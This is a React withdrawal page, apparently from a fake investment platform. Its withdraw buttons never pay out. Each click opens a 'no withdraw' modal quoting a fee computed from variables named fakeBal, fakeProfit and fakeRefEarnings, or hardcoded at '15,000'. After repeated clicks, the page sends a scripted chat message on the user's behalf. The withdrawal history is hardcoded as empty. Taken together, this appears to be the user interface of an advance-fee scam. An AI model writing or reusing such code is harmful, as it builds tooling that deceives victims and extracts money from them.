import React, { useState } from "react";
import { AuthContext } from "../../context/AuthContext";
import NoWithdrawModal from "../NoWithdrawModal";
const Withdrawal = () => {
  const { user } = React.useContext(AuthContext);
  const sendMess = (message) => {
    window.tidioChatApi.messageFromVisitor(message);
  };
  function nma(n) {
    var j = "1";
    for (let i = 0; i < n - 1; i++) {
      j += `${0}`;
    }
    return j;
  }

  const log10 = (x) => Math.floor(Math.log(x) / Math.LN10);
  const profit = useState(
    user.earnings.reduce(function (a, b) {
      return a + b;
    }, 0)
  )[0];
  const fakeBalNma = useState(nma(log10(user?.accountBal)));
  const fakeProfitNma = useState(nma(log10(profit)));
  // const fakeReferralNma = useState(nma(log10(user?.referral * 100)));
  const fakeBal = useState(
    // Math.round(
    //   Math.floor(
    //     Math.round(user?.accountBal) + Math.round(user?.accountBal) / 2
    //   ) / 1000
    // ) * 1000
    Math.round(
      Math.floor(Math.round(user?.accountBal + user?.accountBal * 0.02)) /
        parseInt(fakeBalNma)
    ) * parseInt(fakeBalNma)
  )[0];

  const fakeProfit = useState(
    Math.round(
      Math.floor(Math.round(profit + profit * 0.02)) / parseInt(fakeProfitNma)
    ) * parseInt(fakeProfitNma)
  )[0];
  const fakeRefEarnings = useState(
    Math.round(
      Math.floor(
        Math.round(user?.referral * 100) + Math.round(user?.referral * 100) / 2
      )
    )
  )[0];
  console.log(fakeBal, fakeProfit, fakeRefEarnings);
  let [isOpen, setIsOpen] = useState(false);
  let [modalPrice, setModalPrice] = useState(0);
  let [modalType, setModalType] = useState("");

  function closeModal() {
    setIsOpen(false);
  }

  function openModal() {
    setIsOpen(true);
  }
  const [modalCount, setmodalCount] = useState(1);
  return (
    <>
      <NoWithdrawModal
        isOpen={isOpen}
        closeModal={closeModal}
        modalPrice={modalPrice}
        modalType={modalType}
      />
      <div className='grid grid-cols-12 gap-4 p-4 pt-10 '>
        <div className='col-span-12 lg:col-span-4 p-4 rounded-lg flex flex-col justify-center items-center space-y-4 bg-paint'>
          <span className='text-xl text-center'>Account Balance</span>
          <span className='text-6xl text-gray-500'>${user?.accountBal}</span>
          <div className='flex space-x-4'></div>
          <div
            className='btn bg-coincap w-8/12 text-center cursor-pointer'
            onClick={async () => {
              await setModalType("accBal");
              await setModalPrice(fakeBal);
              await setmodalCount(modalCount + 1);
              if (modalCount >= 8 && user?.earnings.length >= 7) {
                return sendMess("I will like to withdraw all my earnings");
              }
              return openModal();
            }}
          >
            Withdraw All
          </div>
        </div>
        <div className='col-span-12 lg:col-span-4 p-4 rounded-lg flex flex-col justify-center items-center space-y-4 bg-paint'>
          <span className='text-xl text-center'>Total Profit</span>
          <span className='text-6xl text-gray-500'>
            $
            {user?.earnings.reduce(function (a, b) {
              return a + b;
            }, 0)}
          </span>
          <div className='flex space-x-4'></div>
          <div
            className='btn bg-coincap w-8/12 text-center cursor-pointer'
            onClick={async () => {
              await setModalType("profit");
              await setModalPrice("15,000");
              await setmodalCount(modalCount + 1);
              if (modalCount >= 8 && user?.earnings.length >= 7) {
                return sendMess("I will like to withdraw all my earnings");
              }
              return openModal();
            }}
          >
            Withdraw Earnings
          </div>
        </div>
        <div className='col-span-12 lg:col-span-4 p-4 rounded-lg flex flex-col justify-center items-center space-y-4 bg-paint'>
          <span className='text-xl text-center'>Referral Earnings</span>
          <span className='text-6xl text-gray-500'>
            ${user?.referral * 100}
          </span>
          <div className='flex space-x-4'></div>
          <div
            className='btn bg-coincap w-8/12 text-center cursor-pointer'
            onClick={async () => {
              await setModalType("referral");
              await setModalPrice(fakeRefEarnings);

              await setmodalCount(modalCount + 1);
              if (modalCount >= 8 && user?.earnings.length >= 7) {
                return sendMess("I will like to withdraw all my earnings");
              }
              return openModal();
            }}
          >
            Withdraw Ref
          </div>
        </div>
        <div className='col-span-12 rounded-lg bg-paint flex flex-col pb-72 mt-4'>
          <div className='text-white flex flex-row bg-coincap p-2 rounded-t-lg space-x-2'>
            <span>
              <svg
                className='w-6 h-6'
                fill='none'
                stroke='currentColor'
                viewBox='0 0 24 24'
                xmlns='http://www.w3.org/2000/svg'
              >
                <path
                  strokeLinecap='round'
                  strokeLinejoin='round'
                  strokeWidth='2'
                  d='M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z'
                ></path>
              </svg>
            </span>
            <span className='uppercase text-1xl'>WITHDRAWAL</span>
          </div>
          <div className='py-4 px-2'>
            <span className=''>No previous withdrawal made</span>
          </div>
        </div>
      </div>
    </>
  );
};

export default Withdrawal;
